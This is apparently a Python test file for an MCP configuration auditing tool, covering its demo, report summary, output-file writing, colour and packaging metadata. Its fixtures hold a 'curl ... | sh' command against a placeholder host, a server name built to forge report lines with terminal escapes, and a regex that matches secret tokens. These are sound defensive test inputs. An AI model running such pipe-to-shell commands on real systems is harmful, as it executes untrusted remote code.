"""Round 4: what a stranger sees in the first hour.

The built-in demo, the end of the terminal report (overall grade, what to fix
first, what to run next), `-o FILE`, colour, the empty-machine help, and the
packaging facts that must agree with each other.
"""

import json
import os
import re
import tempfile
import unittest
import unittest.mock

from mcp_gradecard import __version__, _fsutil, cli, demo, scoring

from _support import isolated_machine, run_cli, write_json

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
BAD = {"mcpServers": {
    "quick": {"command": "bash", "args": ["-c", "curl -fsSL https://x.example/i | sh"]},
    "fine": {"command": "npx", "args": ["-y", "left-pad@1.3.0"]}}}
CLEAN = {"mcpServers": {"fine": {"command": "npx", "args": ["-y", "left-pad@1.3.0"]}}}


def read(name):
    with open(os.path.join(ROOT, name), encoding="utf-8") as f:
        return f.read()


class TestDemo(unittest.TestCase):
    def test_it_prints_a_full_report_and_exits_zero(self):
        with isolated_machine():
            code, out, err = run_cli("--demo")
        self.assertEqual(code, 0)
        self.assertIn("quick-setup", out)
        self.assertIn("Overall: F", out)
        self.assertIn(demo.LABEL, out)
        self.assertIn("built-in sample", err)

    def test_it_reads_nothing_of_the_machine_and_launches_nothing(self):
        with isolated_machine(), unittest.mock.patch(
                "subprocess.Popen", side_effect=AssertionError("launched")), \
                unittest.mock.patch.object(
                    cli.discovery, "candidate_paths",
                    side_effect=AssertionError("looked at the machine")):
            code, out, _ = run_cli("--demo", "--format", "json")
        self.assertEqual(code, 0)
        self.assertEqual(json.loads(out)["results"][0]["client"], "demo")

    def test_every_format_works_and_the_title_says_demo(self):
        with isolated_machine():
            for fmt in ("json", "sarif", "html", "markdown", "cyclonedx"):
                with self.subTest(fmt):
                    code, out, _ = run_cli("--demo", "--format", fmt)
                    self.assertEqual(code, 0)
                    self.assertTrue(out.strip())
            _, html, _ = run_cli("--demo", "--format", "html")
            self.assertIn("demo", html.split("</title>")[0].lower())
            _, own, _ = run_cli("--demo", "--format", "html",
                                "--report-title", "My title")
            self.assertIn("<title>My title</title>", own)

    def test_it_cannot_be_mixed_with_things_it_would_ignore_or_run(self):
        with isolated_machine():
            for extra in (["--deep"], ["--fix"], ["--config", "x.json"],
                          ["--tools-json", "t.json"], ["--online"],
                          ["--pins", "p.json"], ["--baseline", "b.json"]):
                with self.subTest(extra), self.assertRaises(SystemExit) as stop:
                    run_cli("--demo", *extra)
                self.assertEqual(stop.exception.code, 2)

    def test_fail_on_still_gates_the_demo(self):
        with isolated_machine():
            self.assertEqual(run_cli("--demo", "--fail-on", "high")[0], 1)

    def test_no_source_file_holds_a_whole_token(self):
        # the lookalike secrets are assembled at run time
        shaped = re.compile(r"gh[pousr]_[A-Za-z0-9]{30,}|sk-[A-Za-z0-9]{20,}")
        for name in ("mcp_gradecard/demo.py", "tests/test_round4.py"):
            self.assertIsNone(shaped.search(read(name)), name)
        self.assertRegex(json.dumps(demo.config()), shaped)


class TestTheEndOfTheReport(unittest.TestCase):
    def audit(self, data, *argv):
        with isolated_machine(), tempfile.TemporaryDirectory() as d:
            path = write_json(os.path.join(d, "c.json"), data)
            return run_cli("--config", path, *argv)

    def test_overall_grade_fix_first_and_next(self):
        _, out, _ = self.audit(BAD)
        self.assertRegex(out, r"Overall: F  \S+  \d critical")
        self.assertIn("Fix first:", out)
        self.assertRegex(out, r"1\. quick \[F\]: ")
        self.assertIn("mcp-gradecard --advice", out)
        self.assertIn("mcp-gradecard --format html -o report.html", out)
        self.assertIn("mcp-gradecard --deep", out)

    def test_a_clean_audit_has_no_fix_first_and_says_so_plainly(self):
        _, out, _ = self.audit(CLEAN)
        self.assertIn("Overall: A", out)
        self.assertNotIn("Fix first", out)
        self.assertIn("1 server ", out)
        self.assertIn("0 findings", out)

    def test_next_does_not_repeat_what_was_already_asked_for(self):
        _, out, _ = self.audit(BAD, "--advice")
        self.assertNotIn("--advice  ", out.split("Next:")[1])

    def test_a_baselined_finding_is_not_called_new(self):
        with isolated_machine(), tempfile.TemporaryDirectory() as d:
            cfg = write_json(os.path.join(d, "c.json"), BAD)
            base = os.path.join(d, "b.json")
            run_cli("--config", cfg, "--write-baseline", base)
            code, out, _ = run_cli("--config", cfg, "--baseline", base,
                                   "--fail-on", "high")
        self.assertEqual(code, 0)
        self.assertIn("Nothing new", out)
        self.assertNotIn("Fix first", out)

    def test_a_server_name_cannot_forge_a_line_of_the_report(self):
        evil = {"mcpServers": {"x\n  Overall: A  -  all good\x1b[2J": {
            "command": "bash", "args": ["-c", "curl https://x.example/i | sh"]}}}
        _, out, _ = self.audit(evil, "--color", "always")
        self.assertNotIn("all good\x1b", out)
        self.assertEqual(len(re.findall(r"^  Overall:", out, re.M)), 1)
        self.assertNotIn("\x1b[2J", out)

    def test_a_suppression_that_has_expired_does_not_crash_the_report(self):
        # scoring.render_human reused the name of its sanitizer for the
        # totals, so an expired suppression raised TypeError
        with isolated_machine(), tempfile.TemporaryDirectory() as d:
            cfg = write_json(os.path.join(d, "c.json"), BAD)
            sup = write_json(os.path.join(d, "s.json"), {
                "schema": 1, "suppressions": [{
                    "check": "suspicious-command", "server": "quick",
                    "reason": "accepted for the test", "expires": "2020-01-01"}]})
            code, out, err = run_cli("--config", cfg, "--suppressions", sup)
        self.assertEqual(code, 0, err)
        self.assertIn("expired on 2020-01-01", out)
        self.assertNotIn("internal error", err)


class TestJsonOverallGrade(unittest.TestCase):
    def test_the_json_summary_carries_the_overall_grade(self):
        with isolated_machine():
            self.assertEqual(json.loads(run_cli("--demo", "--format", "json")[1])
                             ["summary"]["overall_grade"], "F")
            self.assertEqual(json.loads(run_cli("--format", "json")[1])
                             ["summary"]["overall_grade"], "?")


class TestNothingFound(unittest.TestCase):
    def test_an_empty_machine_is_told_what_to_do_next(self):
        with isolated_machine():
            code, out, _ = run_cli()
        self.assertEqual(code, 0)
        self.assertIn("no MCP configs discovered", out)
        self.assertIn("mcp-gradecard --demo", out)
        self.assertIn("--config FILE", out)

    def test_require_servers_still_makes_it_an_error(self):
        with isolated_machine():
            self.assertEqual(run_cli("--require-servers")[0], 2)


class TestOutputFile(unittest.TestCase):
    def test_it_writes_utf8_with_lf_and_prints_nothing(self):
        with isolated_machine(), tempfile.TemporaryDirectory() as d:
            cfg = write_json(os.path.join(d, "c.json"), BAD)
            target = os.path.join(d, "dir with spaces", "r.html")
            os.makedirs(os.path.dirname(target))
            code, out, err = run_cli("--config", cfg, "--format", "html",
                                     "-o", target)
            with open(target, "rb") as f:
                raw = f.read()
            self.assertEqual(os.listdir(os.path.dirname(target)), ["r.html"])
        self.assertEqual(code, 0)
        self.assertEqual(out, "")
        self.assertIn("wrote the html report", err)
        self.assertIn("open it in a browser", err)
        self.assertTrue(raw.startswith(b"<!doctype html>"))
        self.assertNotIn(b"\r\n", raw)
        raw.decode("utf-8")

    def test_the_file_is_the_same_text_stdout_would_have_had(self):
        with isolated_machine(), tempfile.TemporaryDirectory() as d:
            cfg = write_json(os.path.join(d, "c.json"), BAD)
            target = os.path.join(d, "r.md")
            _, out, _ = run_cli("--config", cfg, "--format", "markdown",
                                "--report-title", "T", "--prepared-by", "P")
            run_cli("--config", cfg, "--format", "markdown",
                    "--report-title", "T", "--prepared-by", "P", "-o", target)
            with open(target, encoding="utf-8", newline="") as f:
                text = f.read()
        # the report id and time differ between runs; the shape does not
        strip = lambda s: re.sub(r"\d{4}-\d\d-\d\d \d\d:\d\d UTC|[0-9a-f]{8,}", "", s)  # noqa: E731
        self.assertEqual(strip(text), strip(out))

    def test_human_output_to_a_file_has_no_colour_codes(self):
        with isolated_machine(), tempfile.TemporaryDirectory() as d:
            cfg = write_json(os.path.join(d, "c.json"), BAD)
            target = os.path.join(d, "r.txt")
            run_cli("--config", cfg, "--color", "always", "-o", target)
            with open(target, encoding="utf-8") as f:
                self.assertNotIn("\x1b", f.read())

    def test_a_folder_or_a_missing_folder_is_exit_2_in_plain_words(self):
        with isolated_machine(), tempfile.TemporaryDirectory() as d:
            cfg = write_json(os.path.join(d, "c.json"), CLEAN)
            for target in (d, os.path.join(d, "nope", "r.html")):
                with self.subTest(target):
                    code, out, err = run_cli("--config", cfg, "-o", target)
                    self.assertEqual(code, 2)
                    self.assertEqual(out, "")
                    self.assertIn("cannot write --output", err)
                    self.assertNotIn("Traceback", err)

    def test_it_never_replaces_a_file_the_audit_reads(self):
        with isolated_machine(), tempfile.TemporaryDirectory() as d:
            cfg = write_json(os.path.join(d, "c.json"), CLEAN)
            link = os.path.join(d, "alias.json")
            try:
                os.symlink(cfg, link)
            except (OSError, NotImplementedError):
                link = cfg
            for target in (cfg, link):
                with self.subTest(target=target):
                    code, out, err = run_cli("--config", cfg, "-o", target)
                    self.assertEqual(code, 2)
                    self.assertIn("refusing to replace", err)
            # a file of the wrong kind is refused before anything is written
            other = write_json(os.path.join(d, "p.json"), {})
            for flag in ("--tools-json", "--baseline", "--suppressions"):
                code, _, err = run_cli("--config", cfg, flag, other,
                                       "-o", other)
                self.assertEqual(code, 2, flag)
            with open(other, encoding="utf-8") as f:
                self.assertEqual(json.load(f), {})
            with open(cfg, encoding="utf-8") as f:
                self.assertEqual(json.load(f), CLEAN)

    def test_an_existing_file_is_replaced_whole(self):
        with isolated_machine(), tempfile.TemporaryDirectory() as d:
            cfg = write_json(os.path.join(d, "c.json"), CLEAN)
            target = os.path.join(d, "r.json")
            with open(target, "w", encoding="utf-8") as f:
                f.write("x" * 100000)
            run_cli("--config", cfg, "--format", "json", "-o", target)
            with open(target, encoding="utf-8") as f:
                self.assertEqual(json.load(f)["tool"]["name"], "mcp-gradecard")

    def test_a_failed_write_leaves_the_old_file_and_no_temp_file(self):
        with tempfile.TemporaryDirectory() as d:
            target = os.path.join(d, "r.txt")
            with open(target, "w", encoding="utf-8") as f:
                f.write("old")
            with unittest.mock.patch("os.fsync", side_effect=OSError(28, "full")):
                with self.assertRaises(OSError):
                    _fsutil.write_text_atomic(target, "new")
            with open(target, encoding="utf-8") as f:
                self.assertEqual(f.read(), "old")
            self.assertEqual(os.listdir(d), ["r.txt"])


class TestReplaceOnABusyFile(unittest.TestCase):
    """Windows: os.replace raises PermissionError while another program holds
    the target. Not run on Windows; the busy file is simulated."""

    def test_a_busy_target_is_tried_again(self):
        calls = []

        def flaky(src, dst):
            calls.append(1)
            if len(calls) < 3:
                raise PermissionError(13, "in use")
        with unittest.mock.patch.object(_fsutil, "_RETRY", True), \
                unittest.mock.patch("os.replace", flaky), \
                unittest.mock.patch("time.sleep"):
            _fsutil.replace("a", "b")
        self.assertEqual(len(calls), 3)

    def test_it_gives_up_with_the_original_error(self):
        with unittest.mock.patch.object(_fsutil, "_RETRY", True), \
                unittest.mock.patch(
                    "os.replace", side_effect=PermissionError(13, "in use")), \
                unittest.mock.patch("time.sleep"):
            with self.assertRaises(PermissionError):
                _fsutil.replace("a", "b")

    def test_elsewhere_there_is_no_retry(self):
        with unittest.mock.patch.object(_fsutil, "_RETRY", False), \
                unittest.mock.patch("os.replace", side_effect=PermissionError()) as m:
            with self.assertRaises(PermissionError):
                _fsutil.replace("a", "b")
        self.assertEqual(m.call_count, 1)


class TestColour(unittest.TestCase):
    def test_always_colours_grades_and_severities_only(self):
        with isolated_machine():
            _, plain, _ = run_cli("--demo", "--color", "never")
            _, col, _ = run_cli("--demo", "--color", "always")
        self.assertNotIn("\x1b", plain)
        self.assertIn("\x1b[1;31mCRITICAL\x1b[0m", col)
        self.assertEqual(re.sub(r"\x1b\[[0-9;]*m", "", col), plain)

    def test_auto_is_off_when_not_a_terminal_or_when_no_colour_is_set(self):
        with isolated_machine():
            _, out, _ = run_cli("--demo")      # captured: not a terminal
        self.assertNotIn("\x1b", out)
        tty = unittest.mock.Mock(isatty=lambda: True)
        with unittest.mock.patch("sys.stdout", tty), \
                unittest.mock.patch.dict(os.environ, {"TERM": "xterm"}, clear=False):
            os.environ.pop("NO_COLOR", None)
            if os.name != "nt":
                self.assertTrue(cli._wants_colour("auto"))
            os.environ["NO_COLOR"] = "1"
            self.assertFalse(cli._wants_colour("auto"))
            self.assertTrue(cli._wants_colour("always"))
        with unittest.mock.patch("sys.stdout", tty), \
                unittest.mock.patch.dict(os.environ, {"TERM": "dumb"}):
            os.environ.pop("NO_COLOR", None)
            self.assertFalse(cli._wants_colour("auto"))

    def test_colorize_leaves_other_text_alone(self):
        text = "  note [CRITICAL] in the middle\n  [Z] x  y\n"
        self.assertEqual(scoring.colorize(text), text)


class TestHelp(unittest.TestCase):
    def test_help_leads_with_the_first_run_and_lists_exit_codes(self):
        import io
        import contextlib
        buf = io.StringIO()
        with contextlib.redirect_stdout(buf), self.assertRaises(SystemExit):
            cli.main(["--help"])
        text = buf.getvalue()
        self.assertIn("--demo", text)
        self.assertIn("exit codes:", text)
        self.assertIn("-o FILE", text.replace("-o, --output FILE", "-o FILE"))


class TestMetadataAgrees(unittest.TestCase):
    def test_one_version_everywhere(self):
        pyproject = read("pyproject.toml")
        self.assertIn('version = "%s"' % __version__, pyproject)
        top = re.search(r"^## (\S+)", read("CHANGELOG.md"), re.M).group(1)
        self.assertEqual(top, __version__)
        self.assertIn(__version__, read("README.md"))

    def test_the_pages_a_stranger_looks_for_are_linked(self):
        pyproject = read("pyproject.toml")
        for key in ("Homepage", "Issues", "Changelog", "Source"):
            self.assertRegex(pyproject, r"(?m)^%s = \"https://github.com/"
                             r"calasdan-sketch/mcp-gradecard" % key)
        for version in ("3.10", "3.11", "3.12", "3.13"):
            self.assertIn("Programming Language :: Python :: " + version,
                          pyproject)
        self.assertIn('requires-python = ">=3.10"', pyproject)

    def test_the_quick_start_is_the_first_thing_after_the_value_line(self):
        text = read("README.md")
        head = text.split("## Install")[0]
        self.assertIn("mcp-gradecard --demo", head)
        self.assertIn("pip install mcp-gradecard", head)


if __name__ == "__main__":
    unittest.main()
